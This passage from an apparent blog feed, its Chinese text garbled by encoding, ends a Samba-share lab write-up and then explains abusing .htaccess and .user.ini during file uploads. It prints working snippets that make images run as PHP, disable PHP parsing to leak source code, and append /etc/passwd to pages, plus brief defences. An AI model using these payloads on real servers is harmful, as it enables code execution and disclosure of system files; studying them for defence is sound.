class=\"anchor\" href=\"#225å…±äº«ç›®å½•è¿›å…¥è¦å¯†ç è§£å†³\">#</a> 2.2.5 å…±äº«ç›®å½•è¿›å…¥è¦å¯†ç è§£å†³</h5>\n<p>é—®é¢˜æˆªå›¾å¦‚ä¸‹</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221620593.png\" alt=\"image-20221022221620593\" /></p>\n<p>è¿™é‡Œå› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯è€å¸ˆç»™çš„é…ç½®æ–‡ä»¶ï¼Œå‘ç°é…ç½®æ–‡ä»¶åœ¨ public çš„é…ç½®ä¸­æ²¡æœ‰ guest ok å…è®¸åŒ¿åå…±äº«</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221815533.png\" alt=\"image-20221022221815533\" /></p>\n<p>tmp èƒ½å¤Ÿæ­£å¸¸è®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221859980.png\" alt=\"image-20221022221859980\" /></p>\n<p>ä¿®æ”¹åèƒ½æ­£å¸¸è®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222048533.png\" alt=\"image-20221022222048533\" /></p>\n<h5 id=\"226å…±äº«ç›®å½•ä¸èƒ½æ­£å¸¸å†™å…¥æ–‡ä»¶\"><a class=\"anchor\" href=\"#226å…±äº«ç›®å½•ä¸èƒ½æ­£å¸¸å†™å…¥æ–‡ä»¶\">#</a> 2.2.6 å…±äº«ç›®å½•ä¸èƒ½æ­£å¸¸å†™å…¥æ–‡ä»¶</h5>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222139179.png\" alt=\"image-20221022222139179\" /></p>\n<p>è¿™é‡Œæ˜¯å› ä¸º public æƒé™é—®é¢˜ï¼Œè¿™é‡Œæ›´æ”¹æƒé™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222345913.png\" alt=\"image-20221022222345913\" /></p>\n<p>æ›´æ”¹åèƒ½å¤Ÿæ­£å¸¸è®¿é—®æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222414216.png\" alt=\"image-20221022222414216\" /></p>\n<h4 id=\"23sambaå®‰å…¨å…±äº«\"><a class=\"anchor\" href=\"#23sambaå®‰å…¨å…±äº«\">#</a> 2.3Samba å®‰å…¨å…±äº«</h4>\n<h5 id=\"231ç¯å¢ƒå‡†å¤‡\"><a class=\"anchor\" href=\"#231ç¯å¢ƒå‡†å¤‡\">#</a> 2.3.1 ç¯å¢ƒå‡†å¤‡</h5>\n<p>å…³é—­é˜²ç«å¢™å’Œ SELinux</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230620906.png\" alt=\"image-20221022230620906\" /></p>\n<p>åˆ›å»ºå…±äº«ç›®å½•å¹¶è®¾ç½®æƒé™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230755058.png\" alt=\"image-20221022230755058\" /></p>\n<h5 id=\"232ä¿®æ”¹é…ç½®æ–‡ä»¶\"><a class=\"anchor\" href=\"#232ä¿®æ”¹é…ç½®æ–‡ä»¶\">#</a> 2.3.2 ä¿®æ”¹é…ç½®æ–‡ä»¶</h5>\n<p>è¿›å…¥ /etc/samba ç›®å½•ä¿®æ”¹ smb.conf æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231259199.png\" alt=\"image-20221022231259199\" /></p>\n<p>é‡å¯æœåŠ¡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231355253.png\" alt=\"image-20221022231355253\" /></p>\n<h5 id=\"233åˆ›å»ºå…±äº«ç”¨æˆ·æ ¹æ®æƒé™è®¿é—®\"><a class=\"anchor\" href=\"#233åˆ›å»ºå…±äº«ç”¨æˆ·æ ¹æ®æƒé™è®¿é—®\">#</a> 2.3.3 åˆ›å»ºå…±äº«ç”¨æˆ·ï¼Œæ ¹æ®æƒé™è®¿é—®</h5>\n<p>åˆ›å»ºç³»ç»Ÿç”¨æˆ·</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221022231649122.png\" alt=\"image-20221022231649122\" /></p>\n<p>ä¿®æ”¹ç³»ç»Ÿç”¨æˆ·å¯†ç </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232021237.png\" alt=\"image-20221022232021237\" /></p>\n<p>åˆ›å»ºç®¡ç† shamab ç”¨æˆ·ï¼ˆä½¿ç”¨ pdbedit ç®¡ç† Sambaï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232202251.png\" alt=\"image-20221022232202251\" /></p>\n<p>æŸ¥çœ‹æ‰€æœ‰çš„å…±äº«ç”¨æˆ·</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232421854.png\" alt=\"image-20221022232421854\" /></p>\n<p>2.3.4windows å®¢æˆ·ç«¯åˆ©ç”¨è´¦æˆ· lisi è®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235143521.png\" alt=\"image-20221022234754805\" /></p>\n<p>åˆ›å»ºæµ‹è¯•æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235324326.png\" alt=\"image-20221022235324326\" /></p>\n<p>linu ä¸Šé¢ç”¨å¼ ä¸‰ç™»å½•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235809958.png\" alt=\"image-20221022235809958\" /></p>\n<p>åˆ©ç”¨è´¦å· zhangsan æŒ‚è½½ç›®å½•åˆ°æœ¬åœ°</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000130466.png\" alt=\"image-20221023000130466\" /></p>\n<p>è¿›å…¥æŒ‚è½½ç›®å½•åˆ›å»ºç›®å½•æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000217590.png\" alt=\"image-20221023000217590\" /></p>\n<p>ç»™å…±äº«ç›®å½•è®¾ç½®é˜²åˆ é™¤ä½</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000438265.png\" alt=\"image-20221023000438265\" /></p>\n<h5 id=\"test-one\"><a class=\"anchor\" href=\"#test-one\">#</a> test-one</h5>\n<p>windows è´¦å· lisi åˆ é™¤ zhangsan åˆ›å»ºçš„æ–‡ä»¶å¤±è´¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000515094.png\" alt=\"image-20221023000515094\" /></p>\n<h5 id=\"test-two\"><a class=\"anchor\" href=\"#test-two\">#</a> test-two</h5>\n<p>zhangsan åˆ é™¤ lisi ç”¨æˆ·æ–‡ä»¶å¤±è´¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000623905.png\" alt=\"image-20221023000623905\" /></p>\n<h3 id=\"3å®éªŒå°ç»“\"><a class=\"anchor\" href=\"#3å®éªŒå°ç»“\">#</a> 3. å®éªŒå°ç»“</h3>\n",
            "tags": [
                "Linux",
                "Samba"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/",
            "url": "https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/",
            "title": "user.iniå’Œhtaccessæ–‡ä»¶çš„åˆ©ç”¨",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"htaccessæ–‡ä»¶çš„åˆ©ç”¨\"><a class=\"anchor\" href=\"#htaccessæ–‡ä»¶çš„åˆ©ç”¨\">#</a> .htaccess æ–‡ä»¶çš„åˆ©ç”¨</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHA6Ly9odGFjY2Vzcy51dXouY2MvI2FfV1dX\">è‡ªåŠ¨ç”Ÿæˆ.htaccess çš„ç½‘ç«™</span></p>\n<p>åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€ apache æœåŠ¡å™¨é…ç½®ç›¸å…³å‘½ä»¤ï¼Œæä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œä½œç”¨èŒƒå›´æ˜¯å½“å‰ç›®å½•åŠå…¶å­ç›®å½•</p>\n<p>ä½¿ç”¨å‰ï¼Œé¦–å…ˆè¦å¯ç”¨ htaccesï¼Œå°† AllowOveride çš„é…ç½®æ”¹ä¸º all</p>\n<p><strong>AllowOverride ä»å­—é¢ä¸Šè§£é‡Šæ˜¯å…è®¸è¦†ç›–çš„æ„æ€ï¼Œå³ Apache å…è®¸å¦ä¸€é…ç½®æ–‡ä»¶è¦†ç›–ç°æœ‰é…ç½®æ–‡ä»¶ã€‚</strong></p>\n<p>åœ¨ AllowOverride è®¾ç½®ä¸º None æ—¶ï¼Œ .htaccess æ–‡ä»¶å°†è¢«å®Œå…¨å¿½ç•¥ã€‚å½“æ­¤æŒ‡ä»¤è®¾ç½®ä¸º All æ—¶ï¼Œæ‰€æœ‰å…·æœ‰ â€œ.htaccessâ€ ä½œç”¨åŸŸçš„æŒ‡ä»¤éƒ½å…è®¸å‡ºç°åœ¨ .htaccess æ–‡ä»¶ä¸­ã€‚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019211017128.png\" alt=\"image-20221019211017128\" /></p>\n<h3 id=\"é—®é¢˜ç‚¹ä¸€\"><a class=\"anchor\" href=\"#é—®é¢˜ç‚¹ä¸€\">#</a> é—®é¢˜ç‚¹ä¸€</h3>\n<p>PHPStudy ä¸­ AddType application/x-httpd-php ç­‰ Apache å‘½ä»¤ä¹‹æ‰€ä»¥åœ¨ Apache çš„è®¾ç½®æ–‡ä»¶ä¸­è®¾ç½®åæœªå®ç°ç›®æ ‡æ•ˆæœæ˜¯ç”±äº PHP çš„ç‰ˆæœ¬ä¸ç¬¦å¯¼è‡´çš„ï¼Œä½†æ³¨æ„è¿™é‡Œçš„ PHP ç‰ˆæœ¬å¹¶ä¸æ˜¯æŒ‡ PHP7.3.0ã€PHP7.4.0 è¿™ç§ç‰ˆæœ¬å·ï¼Œä¹Ÿä¸æ˜¯é€‚ç”¨äº 32 ä½çš„ PHPã€é€‚ç”¨äº 64 ä½çš„ PHP è¿™ç§ä¸åŒæœºå‹çš„ç‰ˆæœ¬ï¼Œè€Œ<strong>æ˜¯ PHP çš„ NTS (Non Thread Safe) ä¸ TS (Thread Safe) çš„è¿™ç§ä¸åŒç‰ˆæœ¬å¯¼è‡´çš„</strong>ã€‚</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aW5kb3dzLnBocC5uZXQvZG93bmxvYWQv\">PHP For Windows: Binaries and sources Releases</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019230226348.png\" alt=\"\" /></p>\n<ol>\n<li><strong>ts(Thread-Safety)<strong> å³</strong>çº¿ç¨‹å®‰å…¨</strong>ï¼Œå¤šçº¿ç¨‹è®¿é—®æ—¶ï¼Œé‡‡ç”¨äº†åŠ é”æœºåˆ¶ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è®¿é—®è¯¥ç±»çš„æŸä¸ªæ•°æ®æ—¶ï¼Œè¿›è¡Œä¿æŠ¤ï¼Œå…¶ä»–çº¿ç¨‹ä¸èƒ½è¿›è¡Œè®¿é—®ç›´åˆ°è¯¥çº¿ç¨‹è¯»å–å®Œï¼Œå…¶ä»–çº¿ç¨‹æ‰å¯ä½¿ç”¨ã€‚</li>\n<li><strong>nts(None-Thread Safe)<strong> å³</strong>éçº¿ç¨‹å®‰å…¨</strong>ï¼Œå°±æ˜¯ä¸æä¾›æ•°æ®è®¿é—®ä¿æŠ¤ï¼Œæœ‰å¯èƒ½å‡ºç°å¤šä¸ªçº¿ç¨‹å…ˆåæ›´æ”¹æ•°æ®é€ æˆæ‰€å¾—åˆ°çš„æ˜¯ è„æ•°æ® php ä»¥ fast cgi æ–¹å¼è¿è¡Œçš„æ—¶å€™é€‰æ‹©è¿™ä¸ªç‰ˆæœ¬ï¼Œå…·æœ‰æ›´å¥½çš„æ€§èƒ½ï¼›</li>\n</ol>\n<h4 id=\"è§£å†³åŠæ³•\"><a class=\"anchor\" href=\"#è§£å†³åŠæ³•\">#</a> è§£å†³åŠæ³•</h4>\n<p>å®‰è£… TS ç‰ˆæœ¬çš„ phpï¼Œåœ¨ apache é…ç½®ä¸­è®¾ç½®å¥½</p>\n<p>åœ¨ php æ–‡ä»¶å¤¹ä¸­å°† php.ini-development æ–‡ä»¶å¤åˆ¶ä¸€ä»½å‘½åä¸º php.ini</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234241421.png\" alt=\"image-20221019234241421\" /></p>\n<p>æ–°ä¸‹è½½çš„ php æœ¬æ¥æ²¡æœ‰ç°æˆçš„ php.ini æ–‡ä»¶ã€‚åªæ˜¯ç»™äº†</p>\n<p>php.ini-development ï¼ˆå¼€å‘ç¯å¢ƒç”¨ï¼‰ä¸ php.ini-productionï¼ˆç”Ÿäº§ç¯å¢ƒç”¨ï¼‰ä¸¤ä¸ªå»ºè®®ã€‚</p>\n<p>è€Œ php å»åŠ è½½ php.ini ä½œä¸ºé…ç½®æ–‡ä»¶çš„ã€‚æˆ‘ä»¬æ›´å–œæ¬¢å“ªä¸ªå»ºè®®ï¼Œå°±æŠŠå®ƒå¤‡ä»½ï¼Œç„¶åé‡å‘½åä¸º php.ini ç„¶ååŠ å…¥è‡ªå·±ä¸ªæ€§åŒ–çš„é…ç½®å³å¯ã€‚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234518254.png\" alt=\"image-20221019234518254\" /></p>\n<p>æ‰“å¼€ php.iniï¼Œæ‰¾åˆ° extension_dirï¼Œå¹¶æŠŠå‰é¢çš„ &quot;;&quot; ç¬¦å·åˆ æ‰ (åœ¨ php.ini ç›¸å½“äºæ³¨é‡Šç¬¦)ï¼Œå…¶å€¼æ”¹ä¸º &quot;PHP æ–‡ä»¶çš„è·¯å¾„ /ext&quot;ã€‚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019234918061.png\" alt=\"image-20221019234918061\" /></p>\n<p>ä»–æ˜¯æ”¾ php æ‰©å±•çš„ç›®å½•ï¼Œä¿å­˜åï¼Œæˆ‘ä»¬ PHP å°±è®¾ç½®å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥è¦è®¾ç½® Apacheã€‚</p>\n<p>æ¥åˆ° PHPStudy å®‰è£… Apache çš„ç›®å½•ä¸‹ï¼Œæ‰“å¼€ Apache çš„é…ç½®æ–‡ä»¶ httpd.conf, æœç´¢ LoadModuleï¼Œæ‰¾åˆ°æœ‰å¾ˆå¤š LoadModule è¯­å¥çš„åœ°æ–¹ã€‚( <strong>LoadModuleï¼šåŠ è½½ç‰¹å®šçš„ DSO æ¨¡å—ã€‚</strong>)</p>\n<p>åœ¨æœ«å°¾åŠ ä¸Š LoadModule php7_module &quot;PHP æ–‡ä»¶çš„è·¯å¾„ /php7apache2_4.dll&quot; å’Œ PHPIniDir &quot;PHP æ–‡ä»¶çš„è·¯å¾„&quot;ã€‚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221019235835759.png\" alt=\"image-20221019235835759\" /></p>\n<p>å†åŠ ä¸Šä¸€å¥ AddType application/x-httpd-php .phpï¼Œé…ç½®å°±å®Œæˆäº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020000146394.png\" alt=\"image-20221020000146394\" /></p>\n<h3 id=\"åˆ©ç”¨\"><a class=\"anchor\" href=\"#åˆ©ç”¨\">#</a> åˆ©ç”¨</h3>\n<h5 id=\"æ–‡ä»¶è§£æ\"><a class=\"anchor\" href=\"#æ–‡ä»¶è§£æ\">#</a> æ–‡ä»¶è§£æ</h5>\n<p>é¦–å…ˆè¿˜æ˜¯å…ˆè¯´æ–‡ä»¶ä¸Šä¼ ä¸­å¸¸ç”¨çš„åˆ©ç”¨æ–¹å¼</p>\n<p>(8.* æ— æ³•ä½¿ç”¨)</p>\n<p>åœ¨ htaccess æ–‡ä»¶ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼Œä¸Šä¼ åˆ°æœåŠ¡ç«¯åå†ä¸Šä¼ ä¸€ä¸ªå…¶ä»–ä»»æ„åç¼€çš„æ–‡ä»¶ï¼Œéƒ½ä¼šè¢«å½“ä½œ php æ–‡ä»¶è§£æ</p>\n<p><pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">&lt;FilesMatch â€œ.pngâ€&gt;\nSetHandler application&#x2F;x-httpd-php\n&lt;&#x2F;FilesMatch&gt;\n#åŒ¹é…æ–‡ä»¶ä¸­æœ‰hahaå­˜åœ¨\nSetHandler application&#x2F;x-httpd-php\n#SetHandlerå¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶ç”±æŒ‡å®šå¤„ç†ç¨‹åºå¤„ç†\nAddType application&#x2F;x-httpd-php .txt\n#AddTypeå°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020180621597.png\" alt=\"image-20221020180621597\" /></p>\n<p>æ¥ç€èŠä¸€èŠåˆ«çš„åˆ©ç”¨æ–¹å¼</p>\n<h5 id=\"æºç æ³„éœ²\"><a class=\"anchor\" href=\"#æºç æ³„éœ²\">#</a> æºç æ³„éœ²</h5>\n<p>å½“ä½¿ç”¨ PHP ä½œä¸º Apache æ¨¡å—æ—¶ï¼Œä¹Ÿå¯ä»¥ç”¨ Apache çš„é…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚ httpd.confï¼‰å’Œ .htaccess æ–‡ä»¶ä¸­çš„æŒ‡ä»¤æ¥ä¿®æ”¹ php çš„é…ç½®è®¾å®š</p>\n<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ .htaccess æ–‡ä»¶çš„ php_value æŒ‡ä»¤å¯¹ PHP çš„ engine é…ç½®é€‰é¡¹è¿›è¡Œè®¾å®šï¼Œå½“æŠŠ engine çš„å€¼è®¾ä¸º offï¼ˆæˆ– 0ï¼‰æ—¶å¯ä»¥ç¦ç”¨ä¸€ä¸ªæœ¬ç›®å½•å’Œå­ç›®å½•ä¸­çš„ PHP è§£æï¼Œæ­¤æ—¶å°†ä¼šé€ æˆæºç æ³„éœ²ï¼š</p>\n<p>åœ¨ htaccess æ–‡ä»¶ä¸­å†™å…¥</p>\n<p><pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">php_value engine 0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020210713349.png\" alt=\"image-20221020210713349\" /></p>\n<h5 id=\"æ–‡ä»¶åŒ…å«\"><a class=\"anchor\" href=\"#æ–‡ä»¶åŒ…å«\">#</a> æ–‡ä»¶åŒ…å«</h5>\n<p>htaccess æ–‡ä»¶ä¸­åŒæ ·æœ‰ä¸¤ä¸ªé…ç½® auto_prepend_file å’Œ auto_append_fileï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ php_value æ¥è®¾ç½®ï¼Œæ¡ä»¶æ˜¯åŒçº§ç›®å½•ä¸‹æœ‰ php æ–‡ä»¶</p>\n<p><pre class=\"line-numbers language-htaccess\" data-language=\"htaccess\"><code class=\"language-htaccess\">php_value auto_append_file &#x2F;etc&#x2F;passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221020211527232.png\" alt=\"image-20221020211527232\" /></p>\n<h5 id=\"é˜²å¾¡\"><a class=\"anchor\" href=\"#é˜²å¾¡\">#</a> é˜²å¾¡</h5>\n<p>æœ€ç›´æ¥çš„å°±æ˜¯è¿‡æ»¤ htaccess åç¼€</p>\n<p>å¯¹æ–‡ä»¶é‡å‘½åï¼ˆhtaccess æ–‡ä»¶å‘½åå›ºå®šï¼‰</p>\n<h2 id=\"useriniçš„åˆ©ç”¨\"><a class=\"anchor\" href=\"#useriniçš„åˆ©ç”¨\">#</a> user.ini çš„åˆ©ç”¨</h2>\n<p>php.ini æ˜¯ php çš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œåªè¦æ˜¯ä»¥ fastcgi è¿è¡Œçš„ php éƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯¹æ•´ä¸ª web ç¯å¢ƒèµ·ä½œç”¨</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018203121751.png\" alt=\"image-20221018203121751\" /></p>\n<p>user.ini æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ php.iniï¼Œå¦‚æœåœ¨æ–‡ä»¶ä¸Šä¼ ä¸­æ²¡æœ‰å¯¹å…¶è¿›è¡Œé™åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ php.ini çš„é…ç½®ï¼Œæ—¢ç„¶æ˜¯ç”¨æˆ·è‡ªå®šä¹‰ï¼Œé‚£ä¹ˆè‚¯å®šè¦æåˆ°æƒé™é—®é¢˜ã€‚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018204408073.png\" alt=\"image-20221018204408073\" /></p>\n<p>å®˜æ–¹æ–‡æ¡£æåˆ°åªæœ‰åœ¨è¿™ä¸¤ç§æ¨¡å¼çš„ ini è®¾ç½®å¯ä»¥è¢«è¯†åˆ«ï¼Œé‚£ä¹ˆå°±ä¸å¾—ä¸æåˆ°ä»€ä¹ˆæ˜¯ PHP_INI_* æ¨¡å¼</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018175831433.png\" alt=\"image-20221018175831433\" /></p>\n<p>è¿™äº›æ¨¡å¼å†³å®šç€ä¸€ä¸ª PHP çš„æŒ‡ä»¤åœ¨ä½•æ—¶ä½•åœ°ï¼Œæ˜¯å¦èƒ½å¤Ÿè¢«è®¾å®šã€‚æ‰‹å†Œä¸­çš„æ¯ä¸ªæŒ‡ä»¤éƒ½æœ‰å…¶æ‰€å±çš„æ¨¡å¼ã€‚ä¾‹å¦‚æœ‰äº›æŒ‡ä»¤å¯ä»¥åœ¨ PHP è„šæœ¬ä¸­ç”¨ ini_set () æ¥è®¾å®šï¼Œè€Œæœ‰äº›åˆ™åªèƒ½åœ¨ php.ini æˆ– httpd.conf ä¸­ã€‚(ä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„ PHP_INI_PERDIR ä¹Ÿå¯ä»¥åœ¨.user.ini ä¸­è®¾ç½®)ï¼Œuser_ini.cache_ttl æ§åˆ¶ç€é‡æ–°è¯»å–ç”¨æˆ· INI æ–‡ä»¶çš„é—´éš”æ—¶é—´ã€‚é»˜è®¤æ˜¯ 300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰ã€‚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022120119084.png\" alt=\"image-20221022120119084\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">PHP ini_setç”¨æ¥è®¾ç½®php.iniçš„å€¼ï¼Œåœ¨å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ç”Ÿæ•ˆï¼Œè„šæœ¬ç»“æŸåï¼Œè®¾ç½®å¤±æ•ˆã€‚æ— éœ€æ‰“å¼€php.iniæ–‡ä»¶ï¼Œå°±èƒ½ä¿®æ”¹é…ç½®<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³åˆ©ç”¨.user.ini éœ€è¦åœ¨ PHP_INI_USER æ¨¡å¼ï¼ˆPHP_INI_ALL æ¨¡å¼ï¼‰ä¸­ï¼Œé‚£ä¹ˆå“ªäº›é…ç½®å¯ä»¥åœ¨ <strong>.user.ini</strong> ä¸­è®¾å®šå‘¢ï¼Ÿ</p>\n<blockquote>\n<p>php.ini é…ç½®é€‰é¡¹åˆ—è¡¨ï¼ˆ<span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2luaS5saXN0LnBocA==\">http://php.net/manual/zh/ini.list.php</span> ï¼‰</p>\n</blockquote>\n<h3 id=\"åˆ©ç”¨-2\"><a class=\"anchor\" href=\"#åˆ©ç”¨-2\">#</a> åˆ©ç”¨</h3>\n<p>.user.ini ä¸­ä¸¤ä¸ªä¸­çš„é…ç½®å°±æ˜¯ auto_prepend_file å’Œ auto_append_fileã€‚è¿™ä¸¤ä¸ªé…ç½®çš„æ„æ€å°±æ˜¯ï¼šæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚ 1.jpgï¼Œå¯¹åç¼€åæ²¡æœ‰å¤ªå¤šè¦æ±‚ï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„ php æ–‡ä»¶ï¼Œç›¸å½“äºåœ¨ php æ–‡ä»¶ä¸­ä¸­æ’å…¥ä¸€å¥ï¼šrequire (./1.jpg)ã€‚è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äº auto_prepend_file æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼Œauto_append_file åœ¨æ–‡ä»¶æœ€åæ’å…¥ (æ–‡ä»¶åæ’å…¥å¦‚æœç¨‹åºä»¥ exit () ç»“æŸå°±æ— æ³•åˆ©ç”¨)ã€‚</p>\n<p>demoï¼š</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212902209.png\" alt=\"image-20221018212902209\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018212921996.png\" alt=\"image-20221018212921996\" /></p>\n<p>ç»è¿‡æµ‹è¯• php ç‰ˆæœ¬ä» 5.3 å¼€å§‹åˆ° 7.4 éƒ½æ˜¯å¯ç”¨çš„ï¼Œphp8.* çš„æ²¡æœ‰æˆåŠŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221018213744658.png\" alt=\"image-20221018213744658\" /></p>\n<h3 id=\"é˜²å¾¡-2\"><a class=\"anchor\" href=\"#é˜²å¾¡-2\">#</a> é˜²å¾¡</h3>\n<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP æœåŠ¡å™¨ä½¿ç”¨CGI\nFastCGIæ¨¡å¼\nä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>ä¸Šé¢æåˆ°æœ‰ php8.* æ˜¯ä¸å¯ç”¨çš„ï¼Œé‚£ä¹ˆå¯ä½¿ç”¨ php8.* å¯ç”¨ä»æ ¹æºè§£å†³é—®é¢˜</p>\n<p>user.ini ä½¿ç”¨è¿™ä¸¤æ¡æ¡é…ç½®ä¹Ÿæœ‰é™åˆ¶è¯´äº†æ˜¯åœ¨åŒç›®å½•ä¸‹çš„å…¶ä»–.php æ–‡ä»¶ä¸­åŒ…å«é…ç½®ä¸­æ‰€æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦è¯¥ç›®å½•ä¸‹å­˜åœ¨.php æ–‡ä»¶ï¼Œä¸è¦å°†æ–‡ä»¶ä¸Šä¼ è·¯å¾„è®¾ç½®æˆä¸ºæœ¬ç›®å½•ä¸‹ï¼Œå­˜æ”¾ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ä¸è¦å­˜æœ‰ php æ–‡ä»¶ï¼ˆé€šå¸¸åœ¨æ–‡ä»¶ä¸Šä¼ 